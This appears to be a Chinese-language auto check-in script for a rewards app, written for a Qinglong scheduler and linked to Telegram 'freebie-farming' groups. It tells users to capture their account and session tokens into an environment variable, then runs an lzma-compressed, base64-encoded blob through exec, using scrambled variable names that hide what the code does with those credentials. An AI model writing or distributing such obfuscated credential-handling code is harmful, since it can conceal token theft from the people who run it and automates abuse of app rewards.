#   --------------------------------注释&变量区--------------------------------
#   入口 https://app.zhuanbang.net/invite/7079
#   找请求头中NiuToken的值
#  NiuToken=**** 只要**** NiuToken=不要填 NiuToken=不要填 NiuToken=不要填
#   变量名：yuanshen_zb 多号@分割
#   --------------------------------一般不动区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
# 
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#佛曰:  
#        写字楼里写字间，写字间里程序员；  
#        程序人员写程序，又拿程序换酒钱。  
#        酒醒只在网上坐，酒醉还来网下眠；  
#        酒醉酒醒日复日，网上网下年复年。  
#        但愿老死电脑间，不愿鞠躬老板前；  
#        奔驰宝马贵者趣，公交自行程序员。  
#        别人笑我忒疯癫，我笑自己命太贱；  
#        不见满街漂亮妹，哪个归得程序员？
#
#   --------------------------------代码区--------------------------------
'''
cron: 30 11 * * *
new Env('天瑞地安共富签签到');
群组：https://t.me/yangmaoxz
频道地址：https://t.me/ymxzpd

使用方法：
1.打开app
2.抓包任意vapp.tmuyun.com域名headers中的X-ACCOUNT-ID,X-SESSION-ID参数
3.配置文件添加
单账户：export trda_sign="[ {'name': 'xxx','aid': 'id', 'sid': 'xxxx'}]"
多账户：export trda_sign="[
{'name': 'xxx','aid': 'xxxx', 'sid': 'xxxx'},
{'name': 'xxx','aid': 'xxxx', 'sid': 'xxxx'}
]"
参数说明：
bz:备注名随意填写
aid:2步骤中的X-ACCOUNT-ID参数
sid:2步骤中的X-SESSION-ID参数
'''
import lzma,base64
SCmHtnjaIdLWBeNAOEMPDlYUcVsxpRrGkwvfzFyQuJoXqKibgT=base64.b64decode
SCmHtnjaIdLWBeNAOEMPDlYUcVsxpRrGkwvfzFyQuJoXqKibgh=lzma.decompress
exec(SCmHtnjaIdLWBeNAOEMPDlYUcVsxpRrGkwvfzFyQuJoXqKibgh(SCmHtnjaIdLWBeNAOEMPDlYUcVsxpRrGkwvfzFyQuJoXqKibgT('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')))
